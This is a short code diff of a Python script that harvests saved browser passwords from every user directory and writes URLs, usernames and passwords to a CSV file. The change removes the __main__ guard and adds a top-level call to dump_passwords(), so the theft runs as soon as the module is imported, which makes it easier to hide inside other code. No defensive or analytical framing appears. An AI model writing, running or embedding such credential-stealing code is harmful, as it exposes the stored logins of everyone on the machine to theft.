@@ -87,7 +87,7 @@ def try_browser_profiles(user_path, base_path, results):
             if os.path.exists(db_path):
                 get_browser_passwords(db_path, key, results)
 
-if __name__ == "__main__":
+def dump_passwords():
     for user_dir in find_users_directory():
         all_results = []
         for browser, rel_path in BROWSERS.items():
@@ -101,3 +101,5 @@ if __name__ == "__main__":
                 writer = csv.writer(f)
                 writer.writerow(["URL", "Username", "Password"])
                 writer.writerows(all_results)
+
+dump_passwords()
